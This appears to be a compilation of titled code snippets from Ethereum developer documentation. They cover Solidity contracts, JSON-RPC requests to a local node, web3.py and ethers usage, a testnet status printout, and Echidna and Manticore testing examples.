||\nINFO[2023-04-04T18:09:44-04:00] ======================================================\nName:            local-eth-testnet\nUUID:            39372d756ae8\nStatus:          RUNNING\nCreation Time:   Tue, 04 Apr 2023 18:09:03 EDT\n\n========================================= Files Artifacts =========================================\nUUID           Name\nd4085a064230   cl-genesis-data\n1c62cb792e4c   el-genesis-data\nbd60489b73a7   genesis-generation-config-cl\nb2e593fe5228   genesis-generation-config-el\nd552a54acf78   geth-prefunded-keys\n5f7e661eb838   prysm-password\n054e7338bb59   validator-keystore-0\n\n========================================== User Services ==========================================\nUUID           Name                                           Ports                                         Status\ne20f129ee0c5   cl-client-0-beacon                             http: 4000/tcp -> <http://127.0.0.1:54261>    RUNNING\n                                                              metrics: 5054/tcp -> <http://127.0.0.1:54262>\n                                                              tcp-discovery: 9000/tcp -> 127.0.0.1:54263\n                                                              udp-discovery: 9000/udp -> 127.0.0.1:60470\na8b6c926cdb4   cl-client-0-validator                          http: 5042/tcp -> 127.0.0.1:54267             RUNNING\n                                                              metrics: 5064/tcp -> <http://127.0.0.1:54268>\nd7b802f623e8   el-client-0                                    engine-rpc: 8551/tcp -> 127.0.0.1:54253       RUNNING\n                                                              rpc: 8545/tcp -> 127.0.0.1:54251\n                                                              tcp-discovery: 30303/tcp -> 127.0.0.1:54254\n                                                              udp-discovery: 30303/udp -> 127.0.0.1:53834\n                                                              ws: 8546/tcp -> 127.0.0.1:54252\n514a829c0a84   prelaunch-data-generator-1680646157905431468   <none>                                        STOPPED\n62bd62d0aa7a   prelaunch-data-generator-1680646157915424301   <none>                                        STOPPED\n05e9619e0e90   prelaunch-data-generator-1680646157922872635   <none>                                        STOPPED\n\n```\n\n----------------------------------------\n\nTITLE: Querying Ethereum Transactions with SQL\nDESCRIPTION: SQL query to retrieve transaction details sent to the Ethereum Foundation's address. The query calculates ether value, gas used, and transaction fees by joining transaction data and transforming values to human-readable formats.\n\nLANGUAGE: SQL\nCODE:\n```\nWITH temp_table AS (\nSELECT\n    hash,\n    block_number,\n    block_time,\n    \"from\",\n    \"to\",\n    value / 1e18 AS ether,\n    gas_used,\n    gas_price / 1e9 AS gas_price_gwei\nFROM ethereum.\"transactions\"\nWHERE \"to\" = '\\xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe'\nORDER BY block_time DESC\n)\nSELECT\n    hash,\n    block_number,\n    block_time,\n    \"from\",\n    \"to\",\n    ether,\n    (gas_used * gas_price_gwei) / 1e9 AS txn_fee\nFROM temp_table\n```\n\n----------------------------------------\n\nTITLE: Pushing Changes to GitHub in Shell\nDESCRIPTION: Command to push your committed changes to your GitHub repository. This makes your changes available on GitHub for creating a pull request.\n\nLANGUAGE: shell\nCODE:\n```\ngit push\n```\n\n----------------------------------------\n\nTITLE: Memory Buffer Parsing Utility in Solidity\nDESCRIPTION: A utility function that extracts a uint256 from a specific position in a bytes array using assembly, which helps verify function results.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Read a uint from a memory buffer (to make sure we get back the parameters\n    // we sent out)\n    function toUint256(bytes memory _bytes, uint256 _start) internal pure\n        returns (uint256)\n    {\n        require(_bytes.length >= _start + 32, \"toUint256_outOfBounds\");\n        uint256 tempUint;\n\n        assembly {\n            tempUint := mload(add(add(_bytes, 0x20), _start))\n        }\n\n        return tempUint;\n    }     // toUint256\n```\n\n----------------------------------------\n\nTITLE: Verifying Smart Contract on Etherscan with Hardhat\nDESCRIPTION: Command to verify a deployed smart contract on Etherscan using Hardhat, specifying the network and contract address.\n\nLANGUAGE: text\nCODE:\n```\nnpx hardhat verify --network goerli DEPLOYED_CONTRACT_ADDRESS 'Hello World!'\n```\n\n----------------------------------------\n\nTITLE: Initiating ERC-20 Token Deposit in L1StandardBridge from L1 to L2\nDESCRIPTION: This function handles the deposit of ERC-20 tokens from L1 to L2. It transfers tokens from the user to the bridge contract, constructs a cross-domain message to call finalizeDeposit on the L2 bridge, and updates the deposits tracking data structure.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _initiateERC20Deposit(\n    address _l1Token,\n    address _l2Token,\n    address _from,\n    address _to,\n    uint256 _amount,\n    uint32 _l2Gas,\n    bytes calldata _data\n) internal {\n    // When a deposit is initiated on L1, the L1 Bridge transfers the funds to itself for future\n    // withdrawals. safeTransferFrom also checks if the contract has code, so this will fail if\n    // _from is an EOA or address(0).\n    // slither-disable-next-line reentrancy-events, reentrancy-benign\n    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);\n    // Construct calldata for _l2Token.finalizeDeposit(_to, _amount)\n    bytes memory message = abi.encodeWithSelector(\n        IL2ERC20Bridge.finalizeDeposit.selector,\n        _l1Token,\n        _l2Token,\n        _from,\n        _to,\n        _amount,\n        _data\n    );\n    // Send calldata into L2\n    // slither-disable-next-line reentrancy-events, reentrancy-benign\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n    // slither-disable-next-line reentrancy-benign\n    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;\n    // slither-disable-next-line reentrancy-events\n    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Generating a Unique Key and Encoding Value in Parameter Caching\nDESCRIPTION: JavaScript code showing how to generate a unique key using a timestamp and encode a value for the WORM contract. This ensures each write operation uses a unique slot.\n\nLANGUAGE: javascript\nCODE:\n```\nconst main = async () => {\n    const func = await worm.WRITE_ENTRY_CACHED()\n\n    // Need a new key every time\n    const key = await worm.encodeVal(Number(new Date()))\n```\n\n----------------------------------------\n\nTITLE: Setting up Testing Environment with Waffle and Ethers\nDESCRIPTION: TypeScript code for importing necessary dependencies and setting up the testing environment for smart contract tests.\n\nLANGUAGE: typescript\nCODE:\n```\nimport { expect, use } from \"chai\"\nimport { Contract, utils, Wallet } from \"ethers\"\nimport {\n  deployContract,\n  deployMockContract,\n  MockProvider,\n  solidity,\n} from \"ethereum-waffle\"\n\nimport IERC20 from \"../build/IERC20.json\"\nimport AmIRichAlready from \"../build/AmIRichAlready.json\"\n\nuse(solidity)\n```\n\n----------------------------------------\n\nTITLE: Making eth_getBlockByHash Request with curl\nDESCRIPTION: Example of how to make an HTTP request to the eth_getBlockByHash endpoint using curl. This method returns detailed information about a block identified by its hash.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByHash\",\"params\":[\"0xdc0818cf78f21a8e70579cb46a43643f78291264dda342ae31049421c82d21ae\", false],\"id\":1}'\n// Result\n{\n{\n\"jsonrpc\": \"2.0\",\n\"id\": 1,\n\"result\": {\n    \"difficulty\": \"0x4ea3f27bc\",\n    \"extraData\": \"0x476574682f4c5649562f76312e302e302f6c696e75782f676f312e342e32\",\n    \"gasLimit\": \"0x1388\",\n    \"gasUsed\": \"0x0\",\n    \"hash\": \"0xdc0818cf78f21a8e70579cb46a43643f78291264dda342ae31049421c82d21ae\",\n    \"logsBloom\": \"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\",\n    \"miner\": \"0xbb7b8287f3f0a933474a79eae42cbca977791171\",\n    \"mixHash\": \"0x4fffe9ae21f1c9e15207b1f472d5bbdd68c9595d461666602f2be20daf5e7843\",\n    \"nonce\": \"0x689056015818adbe\",\n    \"number\": \"0x1b4\",\n    \"parentHash\": \"0xe99e022112df268087ea7eafaf4790497fd21dbeeb6bd7a1721df161a6657a54\",\n    \"receiptsRoot\": \"0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421\",\n    \"sha3Uncles\": \"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347\",\n    \"size\": \"0x220\",\n    \"stateRoot\": \"0xddc8b0234c2e0cad087c8b389aa7ef01f7d79b2570bccb77ce48648aa61c904d\",\n    \"timestamp\": \"0x55ba467c\",\n    \"totalDifficulty\": \"0x78ed983323d\",\n    \"transactions\": [\n    ],\n    \"transactionsRoot\": \"0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421\",\n    \"uncles\": [\n    ]\n}\n}\n```\n\n----------------------------------------\n\nTITLE: Including web3.js via CDN in HTML\nDESCRIPTION: Code snippet showing how to include web3.js directly into a web page using the JSDelivr CDN. This is the simplest way to add the library to client-side web projects.\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Smart Contract for Gas Consumption Testing\nDESCRIPTION: Solidity contract with an expensive operation that is only triggered with specific input values, used to demonstrate gas consumption testing.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  uint state;\n\n  function expensive(uint8 times) internal {\n    for(uint8 i=0; i < times; i++)\n      state = state + i;\n  }\n\n  function f(uint x, uint y, uint8 times) public {\n    if (x == 42 && y == 123)\n      expensive(times);\n    else\n      state = 0;\n  }\n\n  function echidna_test() public returns (bool) {\n    return true;\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Starting an IPython Environment and Importing web3.py\nDESCRIPTION: Commands to launch IPython interactive shell and import the Web3 module from web3.py library, which is the first step in creating a Python environment for Ethereum development.\n\nLANGUAGE: bash\nCODE:\n```\nipython\n```\n\nLANGUAGE: python\nCODE:\n```\nIn [1]: from web3 import Web3\n```\n\n----------------------------------------\n\nTITLE: Starting an IPython Environment and Importing web3.py\nDESCRIPTION: Commands to launch IPython interactive shell and import the Web3 module from web3.py library, which is the first step in creating a Python environment for Ethereum development.\n\nLANGUAGE: bash\nCODE:\n```\nipython\n```\n\nLANGUAGE: python\nCODE:\n```\nIn [1]: from web3 import Web3\n```\n\n----------------------------------------\n\nTITLE: Client Dig Action Handler\nDESCRIPTION: The player clicks a map cell button to call the dig function, which invokes the dig function on the GameSystem contract.\n\nLANGUAGE: TypeScript\nCODE:\n```\n// From App.tsx line 188\n// Calls the dig function when a map cell button is clicked\n```\n\nLANGUAGE: TypeScript\nCODE:\n```\n// From createSystemCalls.ts lines 33-36\ndig: (x: number, y: number) => {\n  const tx = world.tx.app__dig(x, y);\n  return tx;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementando un Contrato HelloWorld en Solidity\nDESCRIPTION: Un contrato inteligente básico que almacena un mensaje durante la creación y permite actualizarlo mediante una función pública. Demuestra el uso de variables de estado, constructores y funciones públicas en Solidity.\n\nLANGUAGE: solidity\nCODE:\n```\n// Especifica la versión de Solidity, utilizando la versión semántica.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.0;\n\n// Defines a contract named `HelloWorld`.\n// Un contrato es una colección de funciones y datos (su estado). Once deployed, a contract resides at a specific address on the Ethereum blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   // Declares a state variable `message` of type `string`.\n   // Las variables de estado son variables cuyos valores se almacenan permanentemente en el almacenamiento del contrato. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // Los constructores se utilizan para inicializar los datos del contrato. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      message = newMessage;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Starting the React Development Server\nDESCRIPTION: Command to launch the React development server which will open the application at http://localhost:3000/ in the browser.\n\nLANGUAGE: bash\nCODE:\n```\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Implementing Safe Token Transfer in Uniswap\nDESCRIPTION: A private function that safely transfers ERC-20 tokens from the exchange to another address. It manually creates the call using ABI functions and verifies the success of the transfer.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _safeTransfer(address token, address to, uint value) private {\n    (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));\n    require(success && (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Different Cache Key Sizes\nDESCRIPTION: Tests encoding of values with different key sizes (one-byte, two-byte, and three-byte keys) to verify the multi-byte encoding logic.\n\nLANGUAGE: solidity\nCODE:\n```\n        .\n        .\n        .\n\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n            cache.encodeVal(0x000F),   // One byte        0x0F\n            cache.encodeVal(0x0010),   // Two bytes     0x1010\n            cache.encodeVal(0x0100),   // Two bytes     0x1100\n            cache.encodeVal(0x1000)    // Three bytes 0x201000\n        );\n```\n\n----------------------------------------\n\nTITLE: Reading Parameters from Calldata in Solidity\nDESCRIPTION: Parses individual parameters from calldata, handling special cases for caching or retrieving from cache based on the first byte.\n\nLANGUAGE: solidity\nCODE:\n```\n// Read a single parameter from the calldata, starting at _fromByte\nfunction _readParam(uint _fromByte) internal\n    returns (uint _nextByte, uint _parameterValue)\n{\n    // The first byte tells us how to interpret the rest\n    uint8 _firstByte;\n\n    _firstByte = uint8(_calldataVal(_fromByte, 1));\n\n    // Read the value, but do not write it to the cache\n    if (_firstByte == uint8(DONT_CACHE))\n        return(_fromByte+33, _calldataVal(_fromByte+1, 32));\n\n    // Read the value, and write it to the cache\n    if (_firstByte == uint8(INTO_CACHE)) {\n        uint _param = _calldataVal(_fromByte+1, 32);\n        cacheWrite(_param);\n        return(_fromByte+33, _param);\n    }\n\n    // If we got here it means that we need to read from the cache\n\n    // Number of extra bytes to read\n    uint8 _extraBytes = _firstByte / 16;\n    uint _key = (uint256(_firstByte & 0x0F) << (8*_extraBytes)) +\n        _calldataVal(_fromByte+1, _extraBytes);\n\n    return (_fromByte+_extraBytes+1, cacheRead(_key));\n\n}  // _readParam\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token with Standard Functions in Solidity\nDESCRIPTION: A complete ERC20 token implementation with constructor initialization for name and symbol. The contract includes standard token functions such as transfer, approve, transferFrom, and balance checking. It also implements SafeMath functionality for overflow protection.\n\nLANGUAGE: solidity\nCODE:\n```\n60806040523480156200001157600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: Information Banner with Call-to-Action for NFTs\nDESCRIPTION: A reusable JSX component that displays an information banner about NFTs with an emoji and a button linking to more NFT information.\n\nLANGUAGE: jsx\nCODE:\n```\n<InfoBanner shouldSpaceBetween emoji=\":eyes:\">\n  <div>Learn more about NFTs</div>\n  <ButtonLink href=\"/nft/\">\n    More on NFTs\n  </ButtonLink>\n</InfoBanner>\n```\n\n----------------------------------------\n\nTITLE: Implementing Cross-Domain Message Sending Functionality\nDESCRIPTION: The sendCrossDomainMessage function that allows contracts to send messages to an account on another domain. It handles the interaction with the cross-domain messenger and includes Slither static analyzer comments for vulnerability exceptions.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * Sends a message to an account on another domain\n     * @param _crossDomainTarget The intended recipient on the destination domain\n     * @param _message The data to send to the target (usually calldata to a function with\n     *  `onlyFromCrossDomainAccount()`)\n     * @param _gasLimit The gasLimit for the receipt of the message on the target domain.\n     */\n    function sendCrossDomainMessage(\n        address _crossDomainTarget,\n        uint32 _gasLimit,\n        bytes memory _message\n    ) internal {\n        // slither-disable-next-line reentrancy-events, reentrancy-benign\n        getCrossDomainMessenger().sendMessage(_crossDomainTarget, _message, _gasLimit);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Enviando Transação Ethereum com Web3.py\nDESCRIPTION: Cria e envia uma transação de transferência de ether entre duas contas, especificando os endereços de origem e destino, o valor a ser transferido e o limite de gás.\n\nLANGUAGE: python\nCODE:\n```\ntx_hash = w3.eth.send_transaction({\n   'from': w3.eth.accounts[0],\n   'to': w3.eth.accounts[1],\n   'value': w3.to_wei(3, 'ether'),\n   'gas': 21000\n})\n```\n\n----------------------------------------\n\nTITLE: Constraining Symbolic Values in Manticore\nDESCRIPTION: Shows how to apply constraints to symbolic values in a state and check if the state is still feasible with those constraints.\n\nLANGUAGE: python\nCODE:\n```\nstate.constrain(symbolic_var != 65)\nif solver.check(state.constraints):\n    # state is feasible\n```\n\n----------------------------------------\n\nTITLE: Ethereum Block Structure in JSON Format\nDESCRIPTION: Example JSON representation of an Ethereum block structure showing basic metadata and transaction list placeholders.\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"number\": 1234567,\n   \"hash\": \"0xabc123...\",\n   \"parentHash\": \"0xdef456...\",\n   ...,\n   \"transactions\": [...]\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Missing Cache Keys in Solidity\nDESCRIPTION: Tests a function that takes legitimate parameters but with an empty cache, demonstrating how the contract handles missing cache keys.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Call with cache keys that aren't there\n    function testNoCacheKey() public {\n        .\n        .\n        .\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n\n            // First value, add it to the cache\n            cache.INTO_CACHE(),\n            bytes32(VAL_A),\n\n            // Second value\n            bytes1(0x0F),\n            bytes2(0x1234),\n            bytes11(0xA10102030405060708090A)\n        );\n```\n\n----------------------------------------\n\nTITLE: Starting the Server Component\nDESCRIPTION: Command to start the server component that holds the secret state and generates zero-knowledge proofs for the Minesweeper game.\n\nLANGUAGE: shell\nCODE:\n```\ncd packages/server\npnpm start\n```\n\n----------------------------------------\n\nTITLE: Using Translation Component in React JSX\nDESCRIPTION: Demonstrates how to transform regular text into translatable content using the Translation component in JSX elements.\n\nLANGUAGE: tsx\nCODE:\n```\n<p>\n  <Translation id=\"page-transactions\" />{\" \"}\n  <Link href=\"link\">\n    <Translation id=\"page-transactions-gas-link\" />\n  </Link>\n</p>\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Configuration File\nDESCRIPTION: Example of executing Echidna with a configuration file to test a smart contract's gas consumption. The output shows the maximum gas used by a function along with the specific call sequence that triggered it.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test gas.sol --config config.yaml\n...\nechidna_test: passed! 🎉\n\nf used a maximum of 1333608 gas\n  Call sequence:\n    f(42,123,249) Gas price: 0x10d5733f0a Time delay: 0x495e5 Block delay: 0x88b2\n\nUnique instructions: 157\nUnique codehashes: 1\nSeed: -325611019680165325\n\n```\n\n----------------------------------------\n\nTITLE: Defining Solidity Version for L1 Standard Bridge\nDESCRIPTION: Specifies the Solidity compiler version for the L1 Standard Bridge contract. The bridge uses Solidity 0.8.9 which includes overflow checking and other safety features.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n```\n\n----------------------------------------\n\nTITLE: splitter() Implementation in EVM Bytecode\nDESCRIPTION: Implementation of the splitter() function which validates that no ETH was sent with the call (non-payable) and then returns the address of the contract for which this is a proxy. The function reads from storage slot 3 to get the proxy address.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n103 | JUMPDEST            |\n104 | CALLVALUE           | CALLVALUE\n105 | DUP1                | CALLVALUE CALLVALUE\n106 | ISZERO              | CALLVALUE==0 CALLVALUE\n107 | PUSH2 0x010f        | 0x010F CALLVALUE==0 CALLVALUE\n10A | JUMPI               | CALLVALUE\n10B | PUSH1 0x00          | 0x00 CALLVALUE\n10D | DUP1                | 0x00 0x00 CALLVALUE\n10E | REVERT              |\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de eth_blockNumber en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour obtenir le numéro du bloc le plus récent en utilisant la méthode eth_blockNumber.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[],\"id\":83}'\n// Result\n{\n  \"id\":83,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x4b7\" // 1207\n}\n```\n\n----------------------------------------\n\nTITLE: Deploying Contract via eth_sendTransaction\nDESCRIPTION: Curl command that sends a transaction to deploy the contract bytecode to the Ethereum network, specifying the sender address and gas limit.\n\nLANGUAGE: bash\nCODE:\n```\ncurl --data '{\"jsonrpc\":\"2.0\",\"method\": \"eth_sendTransaction\", \"params\": [{\"from\": \"0x9b1d35635cc34752ca54713bb99d38614f63c955\", \"gas\": \"0x1c31e\", \"data\": \"0x6060604052341561000f57600080fd5b60eb8061001d6000396000f300606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063c6888fa1146044575b600080fd5b3415604e57600080fd5b606260048080359060200190919050506078565b6040518082815260200191505060405180910390f35b60007f24abdb5865df5079dcc5ac590ff6f01d5c16edbc5fab4e195d9febd1114503da600783026040518082815260200191505060405180910390a16007820290509190505600a165627a7a7230582040383f19d9f65246752244189b02f56e8d0980ed44e7a56c0b200458caad20bb0029\"}], \"id\": 6}' -H \"Content-Type: application/json\" 